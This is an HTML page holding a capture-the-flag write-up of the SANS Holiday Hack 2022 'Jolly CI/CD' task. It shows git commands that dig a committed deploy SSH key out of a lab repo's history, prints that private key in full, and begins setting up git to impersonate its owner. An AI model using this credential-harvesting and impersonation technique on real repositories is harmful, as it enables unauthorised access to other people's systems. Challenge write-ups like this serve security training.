@@ -1,0 +1,1295 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../PrisonEscape/">
+      
+      
+        <link rel="next" href="../../WebRing/">
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.0">
+    
+    
+      
+        <title>Jolly CI/CD - SANS Holiday Hack Challenge 2022 Kringlecon V Golden Rings</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.f79797b0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
+      
+      
+
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#jolly-cicd" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="SANS Holiday Hack Challenge 2022 Kringlecon V Golden Rings" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2022 Kringlecon V Golden Rings" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            SANS Holiday Hack Challenge 2022 Kringlecon V Golden Rings
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Jolly CI/CD
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="SANS Holiday Hack Challenge 2022 Kringlecon V Golden Rings" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2022 Kringlecon V Golden Rings" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    SANS Holiday Hack Challenge 2022 Kringlecon V Golden Rings
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Overview
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../KringleconOrientation/" class="md-nav__link">
+        Kringlecon Orientation
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WanderingAroundTheNorthPole/" class="md-nav__link">
+        Wandering around the north pole
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Tolkien Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Tolkien Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Tolkien Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TolkienRing/WiresharkPhishing/" class="md-nav__link">
+        Wireshark Phishing
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TolkienRing/WindowsEventLogs/" class="md-nav__link">
+        Windows Event Logs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TolkienRing/SuricataRegatta/" class="md-nav__link">
+        Suricata Regatta
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          Elfen Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Elfen Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Elfen Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CloneWithaDifference/" class="md-nav__link">
+        Clone with a difference
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../PrisonEscape/" class="md-nav__link">
+        Prison Escape
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Jolly CI/CD
+      </a>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          Web Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Web Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          Web Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WebRing/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WebRing/NaughtyIP/" class="md-nav__link">
+        Naughty IP
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WebRing/CredentialMining/" class="md-nav__link">
+        Credential Mining
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WebRing/404FTW/" class="md-nav__link">
+        404 FTW
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WebRing/IMDSandXXE/" class="md-nav__link">
+        IMDS, XXE and other abbreviations
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WebRing/OpenBoriaMineDoor/" class="md-nav__link">
+        Open Boria Mine Door
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WebRing/GlamtarielsFountain/" class="md-nav__link">
+        Glamtariel’s Fountain
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          Cloud Ring
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cloud Ring" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Cloud Ring
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CloudRing/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CloudRing/AWSCLIIntro/" class="md-nav__link">
+        AWS CLI Intro
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CloudRing/TrufflehogSearch/" class="md-nav__link">
+        TrufflehogSearch
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CloudRing/ExploitationViaAWSCLI/" class="md-nav__link">
+        Exploitation via AWS CLI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Burning Ring of Fire
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Burning Ring of Fire" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Burning Ring of Fire
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BurningRingOfFire/" class="md-nav__link">
+        Index
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BurningRingOfFire/BuyaHat/" class="md-nav__link">
+        Buy a hat
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BurningRingOfFire/BlockchainDivination/" class="md-nav__link">
+        Blockchain Divination
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BurningRingOfFire/ExploitaSmartContract/" class="md-nav__link">
+        Exploit a smart contract
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ReturningRingsToSanta/" class="md-nav__link">
+        Returning The Golden Rings to Santa
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Conclusion/" class="md-nav__link">
+        Conclusion
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CyberSecurityLearnings/" class="md-nav__link">
+        CyberSecurity Learnings
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="jolly-cicd">Jolly CI/CD</h1>
+<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 width=850 >
+ <tr align= Center>
+  <td width=808 colspan=2 valign=top style='width:605.85pt;border:solid windowtext 1.0pt;
+  padding:0in 5.4pt 0in 5.4pt'>
+  <p class=MyNormalStyle><img border=0 width=19 height=20 id="Picture 360"
+  src="../../images/blog_images/image094.png">Jolly
+  CI/CD &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img border=0
+  width=27 height=25 id="Picture 44"
+  src="../../images/blog_images/image039.png">Elfen
+  Ring &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img
+  border=0 width=25 height=24 id="Picture 362"
+  src="../../images/blog_images/image105.png"
+  alt="A picture containing clipart&#10;&#10;Description automatically generated">Rippin
+  Proudboot</p>
+  </td>
+ </tr>
+ <tr style='height:100.6pt'>
+  <td width=290 rowspan=2 valign=top style='width:217.8pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt;height:100.6pt'>
+  <p class=MyNormalStyle><img border=0 width=275 height=174 id="Picture 366"
+  src="../../images/blog_images/image106.png"
+  alt="A picture containing text&#10;&#10;Description automatically generated"></p>
+  </td>
+  <td width=517 valign=top style='width:388.05pt;border-top:none;border-left:
+  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
+  padding:0in 5.4pt 0in 5.4pt;height:100.6pt'>
+  <p class=MyNormalStyle><img border=0 width=459 height=152 id="Picture 365"
+  src="../../images/blog_images/image107.png"
+  alt="A screenshot of a computer&#10;&#10;Description automatically generated with medium confidence"></p>
+  </td>
+ </tr>
+ <tr style='height:39.85pt'>
+  <td width=517 valign=top style='width:388.05pt;border-top:none;border-left:
+  none;border-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;
+  padding:0in 5.4pt 0in 5.4pt;height:39.85pt'>
+  <p class=MyNormalStyle><u>Hints<br>
+  </u>1) The thing about Git is that every step of development is accessible 
+  even steps you didn't mean to take! git log can show code skeletons.</p>
+  <p class=MyNormalStyle>2) Gitlab repo <a
+  href="http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git">http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git</a></p>
+  <p class=MyNormalStyle>3) If you find a way to impersonate another identity,
+  you might try re-cloning a repo with their credentials.</p>
+  </td>
+ </tr>
+</table>
+
+<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 width=798
+ style='width:598.5pt; margin-xxxleft:-63.25pt;border-collapse:collapse;border:
+ none'>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Clone the git repo and get into the directory where it
+  was cloned into</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">gitlab</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span><span class="o">/</span><span class="n">rings</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="n">powder</span><span class="o">/</span><span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span><span class="o">.</span><span class="n">git</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">cd</span> <span class="n">wordpress</span><span class="o">.</span><span class="n">flag</span><span class="o">.</span><span class="n">net</span><span class="o">.</span><span class="n">internal</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <img src="../../images/blog_images/image108.png">
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Get git logs. Shows a commit with potential mistake
+  with whoops comment</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">git</span> <span class="n">log</span> <span class="o">--</span><span class="n">oneline</span>
+</code></pre></div>
+  </p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <img src="../../images/blog_images/image109.png">
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Show the log with commits. Looks like
+  sporx@kringlecon.com committed with &quot;whoops&quot; comment.</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">git</span> <span class="n">log</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'><img
+  border=0 width=624 height=94 id="Picture 371"
+  src="../../images/blog_images/image110.png"
+  alt="A picture containing graphical user interface&#10;&#10;Description automatically generated"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Show what was committed under that id e19f653bde9ea3de6af21a587e41e7a909db1ca5<br>
+  Looks like user has committed their the private and public key. So we will
+  use these to clone the repo and commit changes impersonating the user</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">git</span> <span class="n">show</span> <span class="n">e19f653bde9ea3de6af21a587e41e7a909db1ca5</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <img id="Picture 372" src="../../images/blog_images/image111.png"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Create .ssh folder and create the private key (.deploy)
+  and public key(.deploy.pub) from the contents above</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">mkdir</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">samways</span><span class="o">/.</span><span class="n">ssh</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">cd</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">samways</span><span class="o">/.</span><span class="n">ssh</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">nano</span> <span class="o">.</span><span class="n">deploy</span>
+</code></pre></div>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>-----BEGIN
+  OPENSSH PRIVATE KEY-----</span></p>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span></p>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5</span></p>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g</span></p>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot</span></p>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==</span></p>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>-----END
+  OPENSSH PRIVATE KEY-----</span></p>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>&nbsp;</span></p>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">nano</span> <span class="o">.</span><span class="n">deploy</span><span class="o">.</span><span class="n">pub</span>
+</code></pre></div>
+  <p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>ssh-ed25519
+  AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri
+  sporx@kringlecon.com</span></p>
+  <p class=MsoNormal style=' margin-xxxbottom:0in;line-height:normal'>&nbsp;</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Set the full read and write permission only for the
+  owner</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">chmod</span> <span class="mi">600</span> <span class="o">.</span><span class="n">deploy</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">chmod</span> <span class="mi">600</span> <span class="o">.</span><span class="n">deploy</span><span class="o">.</span><span class="n">pub</span> 
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">ls</span> <span class="o">-</span><span class="n">lah</span>
+</code></pre></div>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p style='margin:0in'><img border=0 width=486 height=96 id="Picture 373"
+  src="../../images/blog_images/image112.png"
+  alt="Text&#10;&#10;Description automatically generated"></p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+  <p class=TableRowBold>Set the git config email and name</p>
+  </td>
+ </tr>
+ <tr>
+  <td width=798 valign=top style='width:598.5pt;border:solid windowtext 1.0pt;
+  border-top:none;padding:0in 5.4pt 0in 5.4pt'>
+   <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">git</span> <span class="n">config</span> <span class="o">--</span><span class="k">global</span> <span class="n">user</span><span class="o">.</span><span class="n">email</span> <span class="s2">&quot;sporx@kringlecon.com&quot;</span>
